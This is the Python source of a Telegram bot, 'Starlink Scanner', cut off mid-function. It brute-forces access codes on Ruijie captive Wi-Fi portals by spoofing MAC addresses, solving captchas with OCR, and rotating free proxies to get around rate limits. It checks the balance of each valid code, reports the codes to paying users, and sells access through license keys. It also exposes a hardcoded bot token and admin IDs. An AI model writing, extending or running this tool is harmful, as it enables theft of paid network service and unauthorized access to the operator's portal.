# ============================================================================
# ome.py — Starlink Scanner (Full Upgrade)
# ============================================================================
# CHANGES SUMMARY (items 1–25):
#  1. user_proxy_file(user_id) — per-user proxy file path helper (NEW)
#  2. get_proxy_manager_for(user_id) — per-user ProxyManager factory (NEW)
#  3. get_proxy_manager(user_id=None) — backward-compat shim (MODIFIED)
#  4. Every call site of get_proxy_manager() now passes user_id (MODIFIED)
#  5. proxy_clear_file scoped to caller's own proxy file (MODIFIED)
#  6. build_listkeys_text() helper (NEW)
#  7. listkeys_cmd uses helper (MODIFIED)
#  8. admin_listkeys inline button fixed (FIXED)
#  9. admin_stats inline button fixed (FIXED)
# 10. admin_users inline button fixed (FIXED)
# 11. admin_delkey inline button fixed (FIXED)
# 12. 👷 User Workers reply button (NEW)
# 13. waiting_for_target_user_id state (NEW)
# 14. get_worker_preset_keyboard(target) (NEW)
# 15. wk_set_<uid>_<n> callback (NEW)
# 16. wk_cancel_<uid> callback (NEW)
# 17. Auto-stop target scanner both flows (NEW)
# 18. Notify target user both flows (NEW)
# 19. Log to LOG_GROUP_ID both flows (NEW)
# 20. admin_set_user_workers inline button (NEW)
# 21. /setworkers stub (NEW)
# 22. Scanner engine untouched
# 23. Key system untouched
# 24. Logging untouched
# 25. Per-role worker caps preserved
# ============================================================================

# ==================== HARDCODED CREDENTIALS ====================
HARDCODED_BOT_TOKEN = "8838324401:AAGhJVKJL4JZnpR6mr7XQRKwaG3YrI8jGCc"
HARDCODED_ADMIN_IDS = [8320683349,8728200516]

ADMIN_IDS = list(HARDCODED_ADMIN_IDS)


def get_bot_token():
    return HARDCODED_BOT_TOKEN


import asyncio
import aiohttp
import json
import time
import random
import string
import re
import os
import sys
import datetime
import threading
import unicodedata
import concurrent.futures
from datetime import datetime, timedelta, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr

from telegram import (
    InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, ReplyKeyboardRemove, Update, KeyboardButton
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from telegram.constants import ParseMode

from aiohttp_socks import ProxyConnector, ProxyType

# ==================== SPEED CACHES ====================
_ocr_executor = concurrent.futures.ThreadPoolExecutor(max_workers=100)
_connector_cache = {}
_session_cache = {}
_captcha_cache = {}

# ==================== TIME HELPERS ====================
MYANMAR_TZ = timezone(timedelta(hours=6, minutes=30))


def now_mm():
    return datetime.now(MYANMAR_TZ)


def mm_time_str(fmt="%H:%M:%S"):
    return now_mm().strftime(fmt)


def mm_datetime_str(fmt="%Y-%m-%d %H:%M:%S"):
    return now_mm().strftime(fmt)


def mm_from_timestamp(ts, fmt="%H:%M:%S"):
    try:
        return datetime.fromtimestamp(ts, MYANMAR_TZ).strftime(fmt)
    except Exception:
        return datetime.now(timezone.utc).strftime(fmt)

# ==================== SAFE HELPERS ====================
def safe_username(name, max_len=30):
    if not name:
        return "User"
    try:
        name = str(name).strip()
        name = unicodedata.normalize('NFKC', name)
        name = ''.join(ch for ch in name if unicodedata.category(ch)[0] != 'C' or ch in '\n\t')
        if len(name) > max_len:
            name = name[:max_len - 3] + "..."
        return name or "User"
    except Exception:
        return "User"


def escape_html(text):
    if not text:
        return ""
    try:
        return (str(text)
                .replace('&', '&amp;')
                .replace('<', '&lt;')
                .replace('>', '&gt;')
                .replace('"', '&quot;')
                .replace("'", '&#39;'))
    except Exception:
        return ""

# ==================== BALANCE PARSERS ====================
def _extract_plan(bal_str):
    if not bal_str:
        return None
    s = str(bal_str)
    m = re.search(r'🃏:\s*([^|,]+?)\s*[|,]', s)
    if m:
        return m.group(1).strip()[:30]
    m = re.search(r'📋\s*Plan:\s*([^|]+?)\s*\|', s)
    if m:
        return m.group(1).strip()[:30]
    m = re.search(r'Plan:\s*([^|,]+?)\s*[|,]', s)
    if m:
        return m.group(1).strip()[:30]
    if 'unlimited' in s.lower() or '∞' in s:
        return 'Unlimited'
    return None


def _extract_minutes(bal_str):
    if not bal_str:
        return 0
    s = str(bal_str).lower()
    total = 0
    m = re.search(r'(\d+)\s*hr', s)
    if m:
        total += int(m.group(1)) * 60
    m = re.search(r'(\d+)\s*min', s)
    if m:
        total += int(m.group(1))
    if total == 0:
        m = re.search(r'(\d+)\s*h(?:r|our)?', s)
        if m:
            total += int(m.group(1)) * 60
        m = re.search(r'(\d+)\s*m(?:in)?', s)
        if m:
            total += int(m.group(1))
    return total


def _parse_balance(bal_str):
    if bal_str is None or str(bal_str).strip() == "":
        return ("Unknown", 0, "pending")
    s = str(bal_str)
    sl = s.lower()
    if '❌' in s or 'no token' in sl or 'failed' in sl:
        return (_extract_plan(s) or "Failed", -1, "failed")
    if '⚠️' in s or 'limit' in sl:
        return ("Limited", -1, "failed")
    if '...' in s or 'fetching' in sl:
        return ("Pending", 0, "pending")
    plan = _extract_plan(s) or "Unknown"
    mins = _extract_minutes(s)
    if 'unlimited' in plan.lower() or '∞' in plan:
        return (plan, 0, "unlimited")
    if mins == 0:
        return (plan, 0, "unlimited")
    return (plan, mins, "ok")


def _balance_label(minutes):
    if minutes == 0:
        return "Unlimited"
    h = minutes // 60
    m = minutes % 60
    if h > 0 and m > 0:
        return f"{h}h {m}m"
    if h > 0:
        return f"{h}h"
    return f"{m}m"


def _plan_group_sort_key(name, groups):
    if name == "Failed":
        return (3, 0)
    if name == "Pending":
        return (2, 0)
    if name == "Unlimited":
        return (1, 0)
    max_mins = max((m for m, _ in groups.get(name, [])), default=0)
    return (0, -max_mins)

# ==================== KEY SYSTEM ====================
LOG_GROUP_ID = -5414141012

USER_WORKERS = 100
ADMIN_WORKERS = 710

KEYS_FILE = "keys.json"
USERS_FILE = "users.json"

KEYS_LOCK = asyncio.Lock()
USERS_LOCK = asyncio.Lock()


def _load_json_file(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        print(f"[JSON] load error {path}: {e}")
        return default


def _save_json_file(path, data):
    try:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, path)
    except Exception as e:
        print(f"[JSON] save error {path}: {e}")


def load_keys():
    return _load_json_file(KEYS_FILE, {"keys": {}})


def save_keys(data):
    _save_json_file(KEYS_FILE, data)


def load_users():
    return _load_json_file(USERS_FILE, {"users": {}})


def save_users(data):
    _save_json_file(USERS_FILE, data)


def generate_key(prefix="JAZZ"):
    alphabet = string.ascii_uppercase + string.digits
    parts = ["".join(random.choices(alphabet, k=4)) for _ in range(3)]
    return f"{prefix}-" + "-".join(parts)


_UNIT_SECONDS = {
    "s": 1, "min": 60, "m": 60, "h": 3600,
    "d": 86400, "w": 604800, "mo": 2592000, "y": 31536000,
}
_DURATION_RE = re.compile(r"(\d+)\s*(mo|min|[smhdwy])")


def parse_duration(text):
    if not text:
        return None
    t = str(text).strip().lower()
    if t in ("unlimited", "unlim", "inf", "infinite", "life", "perm"):
        return "unlimited"
    total = 0
    matched = False
    for num, unit in _DURATION_RE.findall(t):
        matched = True
        total += int(num) * _UNIT_SECONDS[unit]
    if not matched or total <= 0:
        return None
    return timedelta(seconds=total)


def make_expiry(plan):
    presets = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
    }
    p = (plan or "").strip().lower()
    now = now_mm().astimezone(timezone.utc)
    if p == "unlimited":
        return "9999-12-31T23:59:59+00:00"
    if p in presets:
        return (now + presets[p]).isoformat()
    dur = parse_duration(p)
    if dur == "unlimited":
        return "9999-12-31T23:59:59+00:00"
    if dur:
        return (now + dur).isoformat()
    return None


def create_key_record(plan, code_limit=1000, assigned_to=None):
    expiry = make_expiry(plan)
    if not expiry:
        return None
    data = load_keys()
    key = generate_key()
    while key in data["keys"]:
        key = generate_key()
    data["keys"][key] = {
        "plan": plan,
        "expires_at": expiry,
        "code_limit": int(code_limit),
        "used_codes": 0,
        "assigned_to": str(assigned_to) if assigned_to else None,
        "used_by": None,
        "created_at": mm_datetime_str('%Y-%m-%dT%H:%M:%S'),
    }
    save_keys(data)
    return key


def redeem_key(user_id, key_str):
    uid = str(user_id)
    key_str = (key_str or "").strip()
    if not key_str:
        return False, "❌ Key cannot be empty."

    data = load_keys()
    if key_str not in data["keys"]:
        return False, "❌ Invalid key."

    info = data["keys"][key_str]
    assigned = info.get("assigned_to")
    if assigned and str(assigned) != uid:
        return False, "❌ This key is for a different user."

    used_by = info.get("used_by")
    if used_by and str(used_by) != uid:
        return False, "❌ This key is already used by another user."

    try:
        exp = datetime.fromisoformat(info["expires_at"])
        if now_mm().astimezone(timezone.utc) > exp:
            return False, "❌ This key has expired."
    except Exception:
        pass

    info["used_by"] = uid
    data["keys"][key_str] = info
    save_keys(data)

    users = load_users()
    users["users"][uid] = {
        "key": key_str,
        "plan": info["plan"],
        "expires_at": info["expires_at"],
        "registered_at": mm_datetime_str('%Y-%m-%dT%H:%M:%S'),
    }
    save_users(users)
    return True, info


def get_user_status(user_id):
    uid = str(user_id)
    users = load_users()
    u = users["users"].get(uid)
    if not u:
        return None
    try:
        exp = datetime.fromisoformat(u["expires_at"])
        active = now_mm().astimezone(timezone.utc) <= exp
    except Exception:
        active = False
    return {
        "active": active,
        "plan": u.get("plan", "?"),
        "expires_at": u.get("expires_at", "?"),
        "key": u.get("key", "?"),
    }


def check_user_active(user_id):
    if user_id in ADMIN_IDS:
        return True
    s = get_user_status(user_id)
    return bool(s and s["active"])

# ==================== CONFIG ====================
TIMEOUT_SEC = 20
MAX_CODES_PER_SID = 60
MAX_CODES_PER_SESSION = 60
NUM_WORKERS = 300
RETRY_CONCURRENCY = 30
BALANCE_WORKERS = 30
CODE_CHUNK_SIZE = 25

TOKEN_FILE = "bot_token.txt"
PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http",
    "https://proxylist.geonode.com/api/proxy-list?protocols=http&page=1&limit=500&sort_by=responseTime&sort_type=asc",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]


def run_web_server():
    port = int(os.environ.get("PORT", 8080))

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bot is alive")

        def log_message(self, format, *args):
            pass

    try:
        HTTPServer(("0.0.0.0", port), Handler).serve_forever()
    except Exception as e:
        print(f"[WebServer] Error: {e}")


def start_web_server():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==================== PER-USER PROXY FILES ====================
# (Item 1) Return per-user proxy file path.
def user_proxy_file(user_id):
    """Admin → 'admin_proxies.json'; users → 'user{uid}_proxies.json'."""
    if user_id in ADMIN_IDS:
        return "admin_proxies.json"
    return f"user{user_id}_proxies.json"


# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.good_proxies = []
        self.index = 0
        self.good_index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy):
        proxy = proxy.strip()
        if not proxy:
            return None
        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            proxy = 'http://' + proxy
        return proxy

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r') as f:
                    raw = [line.strip() for line in f if line.strip()]
                self.proxies = [p for p in (self._normalize(r) for r in raw) if p]
            except Exception as e:
                print(f"[ProxyManager] Load error: {e}")
                self.proxies = []
        else:
            self.proxies = []
        self.bad_proxies.clear()
        self.index = 0
        print(f"[ProxyManager] Loaded {len(self.proxies)} proxies from {self.file_path}")

    def reload(self):
        self.load()

    def clear_file(self):
        try:
            with open(self.file_path, 'w') as f:
                f.write('')
        except Exception:
            pass
        self.proxies = []
        self.bad_proxies.clear()
        self.good_proxies.clear()
        self.index = 0

    def add_proxies(self, new_proxies):
        normalized = [self._normalize(p) for p in new_proxies if p.strip()]
        normalized = [p for p in normalized if p]
        existing = set(self.proxies)
        added = []
        for p in normalized:
            if p not in existing:
                added.append(p)
                existing.add(p)
        if added:
            try:
                with open(self.file_path, 'a') as f:
                    for p in added:
                        f.write(p + '\n')
            except Exception as e:
                print(f"[ProxyManager] Append error: {e}")
        self.reload()
        return len(added)

    def mark_good(self, proxy):
        if proxy and proxy not in self.good_proxies:
            self.good_proxies.append(proxy)

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            if self.good_proxies and random.random() < 0.8:
                proxy = self.good_proxies[self.good_index % len(self.good_proxies)]
                self.good_index += 1
                return proxy
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            proxy = available[self.index % len(available)]
            self.index += 1
            return proxy

    async def get_random(self):
        async with self.lock:
            if not self.proxies:
                return None
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            return random.choice(available) if available else None

    async def mark_bad(self, proxy):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)
            if proxy in self.good_proxies:
                try:
                    self.good_proxies.remove(proxy)
                except ValueError:
                    pass

    def stats(self):
        total = len(self.proxies)
        bad = len(self.bad_proxies)
        return total, total - bad


# (Item 2) Per-user manager registry.
_user_proxy_managers = {}


def get_proxy_manager_for(user_id):
    if user_id not in _user_proxy_managers:
        _user_proxy_managers[user_id] = ProxyManager(user_proxy_file(user_id))
    return _user_proxy_managers[user_id]


# (Item 3) Backward-compat shim.
def get_proxy_manager(user_id=None):
    """Per-user manager; user_id=None falls back to first admin."""
    if user_id is not None:
        return get_proxy_manager_for(user_id)
    if ADMIN_IDS:
        return get_proxy_manager_for(ADMIN_IDS[0])
    return get_proxy_manager_for(0)

# ==================== OCR ====================
_ocr_instance = None
_ocr_lock = threading.Lock()


def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        with _ocr_lock:
            if _ocr_instance is None:
                _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

# ==================== PER-USER DATA ====================
user_scanners = {}
user_proxy_checks = {}


def get_user_data(user_id):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        is_admin_user = user_id in ADMIN_IDS
        default_workers = ADMIN_WORKERS if is_admin_user else USER_WORKERS
        saved_workers = default_workers
        w_file = f"workers_{user_id}.txt"
        if os.path.exists(w_file):
            try:
                with open(w_file, "r") as f:
                    saved_workers = int(f.read().strip())
            except Exception:
                saved_workers = default_workers

        user_scanners[user_id] = {
            'mode': 'num6',
            'char_set': '012345678',
            'code_len': 6,
            'start_digit': None,
            'portal_url': saved_url,
            'stop_event': asyncio.Event(),
            'dash_update_event': asyncio.Event(),
            'task': None,
            'stats': {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'start_time': time.time()},
            'valid_codes': [],
            'all_success_codes': [],
            'codes_lock': asyncio.Lock(),
            'limit_codes': [],
            'tried_codes': set(),
            'recent_logs': [],
            'CURRENT_CODE': '----',
            'dash_msg_id': None,
            'menu_msg_id': None,
            'state': None,
            'num_workers': saved_workers,
            'balance_queue': None,
            'balance_sem': None,
            'success_msg_id': None,
            'success_codes_list': [],
            'last_success_edit': 0,
            'code_chunks': [],
            'current_chunk_codes': [],
            'current_chunk_msg_id': None,
            'total_codes_sent': 0,
            'context': None,
            'last_chunk_edit_time': 0,
            'pending_portal_url': None,
        }
    return user_scanners[user_id]

# ==================== UTILITIES ====================
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def ocr_image_bytes_fast(image_bytes):
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""


async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False, timeout=5) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None


def create_connector_for_proxy(proxy):
    return ProxyConnector.from_url(proxy, ssl=False)


async def get_proxy_session(proxy, timeout_sec=15):
    if not proxy:
        return None
    try:
        connector = create_connector_for_proxy(proxy)
        return aiohttp.ClientSession(
            connector=connector, connector_owner=True,
            timeout=aiohttp.ClientTimeout(total=timeout_sec)
        )
    except Exception:
        return None


def get_direct_session(timeout_sec=15):
    try:
        connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=300)
        return aiohttp.ClientSession(
            connector=connector, connector_owner=True,
            timeout=aiohttp.ClientTimeout(total=timeout_sec)
        )
    except Exception:
        return None

# ==================== PORTAL URLS ====================
def _portals_file(user_id):
    return f"portals_{user_id}.json"


def load_user_portals(user_id):
    f = _portals_file(user_id)
    if os.path.exists(f):
        try:
            with open(f, "r", encoding="utf-8") as fh:
                data = json.load(fh)
            if "urls" not in data:
                data["urls"] = []
            if "active" not in data:
                data["active"] = None
            return data
        except Exception:
            pass
    return {"urls": [], "active": None}


def save_user_portals(user_id, data):
    try:
        with open(_portals_file(user_id), "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[Portals] Save error: {e}")


def add_user_portal(user_id, name, url):
    data = load_user_portals(user_id)
    name = (name or "").strip()[:30]
    if not name:
        return False
    existing = {u["name"] for u in data["urls"]}
    if name in existing:
        i = 2
        while f"{name}_{i}" in existing:
            i += 1
        name = f"{name}_{i}"
    now_iso = mm_datetime_str('%Y-%m-%dT%H:%M:%S')
    data["urls"].append({
        "name": name, "url": url,
        "created_at": now_iso, "last_used": now_iso,
    })
    save_user_portals(user_id, data)
    return True


def list_user_portals(user_id):
    return load_user_portals(user_id).get("urls", [])


def delete_user_portal(user_id, name):
    data = load_user_portals(user_id)
    before = len(data["urls"])
    data["urls"] = [u for u in data["urls"] if u["name"] != name]
    after = len(data["urls"])
    if data.get("active") == name:
        data["active"] = None
    save_user_portals(user_id, data)
    return after < before


def set_active_portal(user_id, name):
    data = load_user_portals(user_id)
    for u in data["urls"]:
        if u["name"] == name:
            data["active"] = name
            u["last_used"] = mm_datetime_str('%Y-%m-%dT%H:%M:%S')
            save_user_portals(user_id, data)
            return True
    return False


def get_active_portal(user_id):
    data = load_user_portals(user_id)
    active_name = data.get("active")
    if not active_name:
        return None
    for u in data["urls"]:
        if u["name"] == active_name:
            return u
    return None

# ==================== SID FROM GATEWAY ====================
async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    if ud['stop_event'].is_set():
        return None, None
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query['mac'] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
        async with session.get(spoofed_url, headers=headers, timeout=10, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=10, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
            if sid:
                return sid, mac
    except Exception:
        pass
    return None, None

# ==================== BALANCE CHECKER ====================
async def fetch_balance_with_proxy(active_token, proxy, timeout=5):
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}'
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(url, headers=headers, timeout=timeout) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get('result', data)
                    if not isinstance(inner, dict):
                        return False, "unexpected format"
                    profile_name = inner.get('profileName', 'N/A')
                    raw_total = inner.get('totalMinutes', 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except Exception:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"{type(e).__name__}"
    return False, "unknown"


async def fetch_balance_direct(active_token, timeout=5):
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}'
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get('result', data)
                    if not isinstance(inner, dict):
                        return False, "unexpected format"
                    profile_name = inner.get('profileName', 'N/A')
                    raw_total = inner.get('totalMinutes', 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except Exception:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"Net/Other: {type(e).__name__}"
    return False, "unknown"

# ==================== LIVE SUCCESS DISPLAY ====================
async def send_success_code_chunked(context, user_id, code, balance_str, source):
    ud = get_user_data(user_id)
    line = f"🎫 <code>{escape_html(code)}</code>\n   {escape_html(balance_str)}"
    ud['success_codes_list'].append(line)

    now = time.time()
    if now - ud.get('last_success_edit', 0) < 2.0 and ud.get('success_msg_id'):
        return
    ud['last_success_edit'] = now

    full_text = "Success Codes:\n\n" + "\n\n".join(ud['success_codes_list'])

    if len(full_text) > 4000:
        try:
            msg = await context.bot.send_message(
                chat_id=user_id,
                text="Success Codes:\n\n" + ud['success_codes_list'][-1],
                parse_mode=ParseMode.HTML
            )
            ud['success_msg_id'] = msg.message_id
            ud['success_codes_list'] = [ud['success_codes_list'][-1]]
        except Exception as e:
            print(f"[Success] New message error: {e}")
        return

    if ud.get('success_msg_id') is None:
        try:
            msg = await context.bot.send_message(
                chat_id=user_id, text=full_text, parse_mode=ParseMode.HTML
            )
            ud['success_msg_id'] = msg.message_id
        except Exception as e:
            print(f"[Success] Send error: {e}")
    else:
        try:
            await context.bot.edit_message_text(
                chat_id=user_id, message_id=ud['success_msg_id'],
                text=full_text, parse_mode=ParseMode.HTML
            )
        except Exception as e:
            err = str(e).lower()
            if "message is not modified" in err:
                return
            elif "flood" in err or "too many" in err:
                return
            else:
                try:
                    msg = await context.bot.send_message(
                        chat_id=user_id, text=full_text, parse_mode=ParseMode.HTML
                    )
                    ud['success_msg_id'] = msg.message_id
                except Exception as e2:
                    print(f"[Success] Fallback error: {e2}")


async def flush_final_chunk(context, user_id):
    pass

# ==================== REARRANGE → .txt ONLY ====================
async def send_rearranged_codes(context, user_id, ascending=True):
    ud = get_user_data(user_id)
    async with ud['codes_lock']:
        snapshot = list(ud.get('all_success_codes', []))

    if not snapshot:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text="📭 <b>No codes found yet.</b>",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            print(f"[Rearrange] Send error: {e}")
        return

    groups = {}
    order = []
    for c in snapshot:
        plan, mins, status = _parse_balance(c.get('balance_str', ''))
        if status == "failed":
            key = "Failed"
        elif status == "pending":
            key = "Pending"
        elif status == "unlimited":
            key = "Unlimited"
        else:
            key = plan or "Unknown"
        if key not in groups:
            groups[key] = []
            order.append(key)
        groups[key].append((mins, c))

    order.sort(key=lambda name: _plan_group_sort_key(name, groups))
    for name in groups:
        groups[name].sort(key=lambda x: (-x[0], x[1].get('found_at', 0)))

    total = len(snapshot)

    try:
        ts = mm_datetime_str('%Y%m%d_%H%M%S')
        filename = f"rearranged_{user_id}_{ts}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("=== REARRANGED CODES ===\n")
            f.write(f"User ID : {user_id}\n")
            f.write(f"Date    : {mm_datetime_str('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total   : {total} codes\n")
            f.write(f"Plans   : {len(order)}\n")
            f.write(f"{'='*50}\n\n")
            for name in order:
                entries = groups[name]
                f.write(f"--- {name} ({len(entries)} code(s)) ---\n")
                for mins, c in entries:
                    f.write(f"{c.get('code','?')} | {c.get('balance_str','N/A')}\n")
                f.write("\n")
            f.write(f"{'='*50}\nEnd.\n")
        with open(filename, "rb") as f:
            await context.bot.send_document(
                chat_id=user_id, document=f,
                caption=f"🔄 Rearranged Codes ({total} codes, {len(order)} plans)"
            )
        try:
            os.remove(filename)
        except Exception:
            pass
    except Exception as e:
        print(f"[Rearrange] File send error: {e}")

# ==================== BALANCE WORKER ====================
async def balance_worker(user_id, worker_id):
    ud = get_user_data(user_id)
    if ud['balance_queue'] is None:
        return
    pm = get_proxy_manager(user_id)
    while not ud['stop_event'].is_set():
        try:
            try:
                active_token, code, proxy_str, uid = await asyncio.wait_for(
                    ud['balance_queue'].get(), timeout=1.0
                )
            except asyncio.TimeoutError:
                continue
            if ud['stop_event'].is_set():
                break

            proxy_used = proxy_str or await pm.get_next()
            ok, result = False, "no proxy"
            if proxy_used:
                ok, result = await fetch_balance_with_proxy(active_token, proxy_used, timeout=5)
                if not ok:
                    await pm.mark_bad(proxy_used)
                    proxy_used = await pm.get_random()
                    if proxy_used:
                        ok, result = await fetch_balance_with_proxy(active_token, proxy_used, timeout=5)
            if not ok:
                ok, result = await fetch_balance_direct(active_token, timeout=5)

            balance_str = result if ok else f"❌ {result}"
            source = "proxy" if ok and proxy_used else ("direct" if ok else "❌")

            for item in ud['valid_codes']:
                if item['code'] == code:
                    item['balance_str'] = balance_str
                    item['source'] = source
                    break

            async with ud['codes_lock']:
                for c in ud['all_success_codes']:
                    if c['code'] == code:
                        c['balance_str'] = balance_str
                        c['source'] = source
                        break

            context = ud.get('context')
            if context:
                try:
                    await send_success_code_chunked(context, user_id, code, balance_str, source)
                except Exception as e:
                    print(f"[Success] Error: {e}")

            ud['dash_update_event'].set()
            ud['balance_queue'].task_done()
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0.1)

# ==================== CHECK SINGLE ACCESS CODE ====================
async def check_single_access_code(session, code, current_session_id, login_url,
                                   captcha_base_url, verify_url, headers, user_id, current_proxy):
    ud = get_user_data(user_id)
    if ud['stop_event'].is_set():
        return 'failed'
    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    for _ in range(2):
        if ud['stop_event'].is_set():
            return 'failed'
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not auth_code or len(auth_code) < 2:
            continue
        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(verify_url, json=v_payload, headers=headers, ssl=False, timeout=8) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue
                l_payload = {"accessCode": code, "sessionId": current_session_id, "apiVersion": 1, "authCode": auth_code}
                async with session.post(login_url, json=l_payload, headers=headers, ssl=False, timeout=10) as l_resp:
                    ud['stats']['tried'] += 1
                    l_text = (await l_resp.text()).lower()
                    if 'request limited' in l_text:
                        return 'limit'
                    if '"success":true' in l_text:
                        ud['stats']['hits'] += 1
                        pm = get_proxy_manager(user_id)
                        pm.mark_good(current_proxy)
                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                        active_token = token_match.group(1) if token_match else None
                        found_ts = time.time()
                        entry = {
                            'code': code,
                            'balance_str': '...fetching...',
                            'source': '...',
                            'active_token': active_token,
                            'timestamp': found_ts,
                        }
                        if not any(item['code'] == code for item in ud['valid_codes']):
                            ud['valid_codes'].append(entry)
                        async with ud['codes_lock']:
                            ud['all_success_codes'].append({
                                'code': code,
                                'balance_str': '...fetching...',
                                'source': '...',
                                'found_at': found_ts,
                                'active_token': active_token,
                            })
                        ud['dash_update_event'].set()
                        if active_token and ud['balance_queue']:
                            await ud['balance_queue'].put((active_token, code, current_proxy, user_id))
                        elif not active_token:
                            entry['balance_str'] = "❌ no token"
